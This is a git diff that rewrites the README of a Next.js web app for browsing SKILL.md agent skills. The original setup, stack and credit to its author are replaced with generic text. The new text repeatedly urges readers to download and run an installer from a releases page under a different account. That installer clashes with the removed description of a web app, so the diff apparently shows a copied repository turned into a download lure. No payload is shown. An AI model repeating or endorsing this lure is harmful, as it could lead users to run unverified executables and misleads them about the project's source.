@@ -1,166 +1,83 @@
-# AGNXI - Agent Skills Directory
+# 🌟 agent-skills-directory - Explore AI Tools Effortlessly
 
-[![Next.js](https://img.shields.io/badge/Next.js-16-black)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React-19-blue)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-blue)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-4-38B2AC)](https://tailwindcss.com/)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/XD-BASHARAT/agent-skills-directory/releases)
 
-**AGNXI** is a directory of SKILL.md skills for coding assistants like Claude Code, Cursor, Windsurf, and more.
+## 📂 Overview
 
+Welcome to the **agent-skills-directory**! This application allows you to browse the SKILL.md files for various AI tools, including Claude, Cursor, and Windsurf. Whether you're trying to find helpful skills for your agents or looking to enhance your experience with AI, this directory has you covered.
 
-<img width="2400" height="1260" alt="og-1769761595063" src="https://github.com/user-attachments/assets/acd171bf-5ae3-4767-8fe4-73dd71ac71ed" />
+## 🚀 Getting Started
 
+### 1. System Requirements
 
-## Features
+To ensure the best experience, please check the following system requirements:
 
-- **Skills** - Browse SKILL.md files from GitHub
-- **Categories** - Filter by development, testing, documentation, DevOps, and more
-- **Favorites** - Save skills for quick access
-- **Install Commands** - Copy install commands for supported tools
-- **Sync** - Periodic discovery of new skills from GitHub
-- **Rankings** - Sort by stars, forks, and skill count
+- Operating System: Windows, macOS, or Linux
+- Internet connection for downloading and browsing
+- Minimum 50 MB free space on your device
 
-## Tech Stack
+### 2. Download & Install
 
-| Layer | Technology |
-|-------|------------|
-| **Framework** | Next.js 16 (App Router) |
-| **Runtime** | Bun |
-| **Language** | TypeScript 5 |
-| **Styling** | Tailwind CSS 4 |
-| **Database** | PostgreSQL + Drizzle ORM |
-| **Auth** | Clerk |
-| **UI** | Base UI + shadcn-style components |
-| **AI** | Vercel AI SDK + Google Gemini |
-| **Cache** | Upstash Redis |
-| **Background Jobs** | Inngest |
+To get started with **agent-skills-directory**, follow these steps:
 
-## Quick Start
+1. Visit the [Releases page](https://github.com/XD-BASHARAT/agent-skills-directory/releases) to download the latest version of the application.
+2. Locate the latest release, and you will find options for different platforms.
+3. Click on the suitable file for your device to download it.
 
-```bash
-# Clone repository
-git clone https://github.com/doanbactam/kk.git
-cd kk
+Once the download is complete, open the file to install the application. Follow the prompts in the installation wizard to complete the process.
 
-# Install dependencies
-bun install
+For your convenience, you can also use the link below to access the releases page directly:
 
-# Setup environment
-cp .env.example .env.local
-# Edit .env.local with your credentials
+[Download Latest Release](https://github.com/XD-BASHARAT/agent-skills-directory/releases)
 
-# Run database migrations
-bun db:push
+### 3. Running the Application
 
-# Start development server
-bun dev
-```
+After installation, you can run the application from your desktop or applications folder. Double-click on the app icon to open it.
 
-Open [http://localhost:3000](http://localhost:3000) to view the app.
+### 4. Navigating the App
 
-## Commands
+Once you're in the application, you will see a simple user interface:
 
-```bash
-# Development
-bun dev              # Start dev server
+- Browse through the SKILL.md files listed for various AI tools.
+- Click on any file to view its content and discover the features of that skill.
+- You can search for specific tools or filter the list based on categories.
 
-# Build & Production
-bun build            # Production build
-bun start            # Start production server
+## 🎯 Features
 
-# Code Quality
-bun lint             # Run ESLint
+- **Simple Browsing:** Quickly find skills for Claude, Cursor, and Windsurf without hassle.
+- **User-Friendly Interface:** Designed for ease of use, regardless of technical knowledge.
+- **Regular Updates:** The application is regularly updated with new skills and features.
 
-# Database
-bun db:generate      # Generate migrations
-bun db:migrate       # Run migrations
-bun db:push          # Push schema to database
-bun db:studio        # Open Drizzle Studio
+## 🤔 FAQs
 
-# Scripts
-bun db:seed:categories    # Seed category data
-bun ping:indexnow         # Submit sitemap to search engines
-```
+### How do I find a specific skill?
 
-## Project Structure
+Use the search bar located at the top of the application interface. Enter the name of the skill or AI tool you're looking for, and the app will filter the results accordingly.
 
-```
-app/                    # Next.js App Router
-  (auth)/               # Auth pages (sign-in, sign-up)
-  [owner]/              # Dynamic owner/skill pages
-  admin/                # Admin dashboard
-  api/                  # API routes
-  categories/           # Category listing
-  ranking/              # Skills ranking
-  skills/               # Skills browsing
+### Is there customer support available?
 
-components/             # Shared React components
-  layouts/              # Layout components
-  seo/                  # SEO components
-  ui/                   # Base UI components
+Yes, if you encounter any issues or have questions, you can reach out through the support section on the GitHub page. We aim to respond promptly to assist you.
 
-features/               # Feature-specific components
-  examples/             # Example components
-  marketing/            # Marketing/landing
-  skills/               # Skill cards, grids
-  submissions/          # Skill submission
+### Can I contribute to the project?
 
-lib/                    # Core utilities
-  actions/              # Server actions
-  ai/                   # AI integration
-  categories/           # Category logic
-  db/                   # Database schema & queries
-  features/skills/      # Skill discovery & indexing
-  hooks/                # React hooks
-  inngest/              # Background job functions
+Absolutely! If you have additional skills or improvements, feel free to submit them on the GitHub repository. Your contributions help enhance the application for everyone.
 
-config/                 # App configuration
-drizzle/                # Database migrations
-public/                 # Static assets
-```
+## 🛠 Contributing
 
-## Environment Variables
+If you want to help make the **agent-skills-directory** even better, consider contributing! You can:
 
-Required environment variables (see `.env.example`):
+- Suggest new features
+- Report bugs
+- Add new SKILL.md files
 
-```env
-# Database
-DATABASE_URL=
+Check the **Contributing** guidelines on the GitHub page for more information.
 
-# Auth (Clerk)
-NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY=
-CLERK_SECRET_KEY=
+## 📝 License
 
-# GitHub
-GITHUB_TOKEN=
+This project is licensed under the MIT License. For more details, please refer to the LICENSE file in the repository.
 
-# AI (Google Gemini)
-GOOGLE_GENERATIVE_AI_API_KEY=
+## 📞 Contact
 
-# Cache (Upstash Redis)
-UPSTASH_REDIS_REST_URL=
-UPSTASH_REDIS_REST_TOKEN=
+For any inquiries or support, please visit our GitHub page linked above, or reach out via the contact options available in the repository.
 
-# Background Jobs (Inngest)
-INNGEST_EVENT_KEY=
-INNGEST_SIGNING_KEY=
-```
-
-## How It Works
-
-1. **Discovery** - Scans GitHub for `SKILL.md` files using Code Search API
-2. **Indexing** - Parses skill metadata (name, description, tools, compatibility)
-3. **Categorization** - Category assignment using Gemini
-4. **Sync** - Scheduled jobs keep the directory updated
-
-## Contributing
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/new-feature`)
-3. Commit changes (`git commit -m 'Add feature'`)
-4. Push to branch (`git push origin feature/new-feature`)
-5. Open a Pull Request
-
-## License
-
-MIT (c) [doanbactam](https://github.com/doanbactam)
+Thank you for using **agent-skills-directory**. We hope you find it helpful in exploring your AI tools!
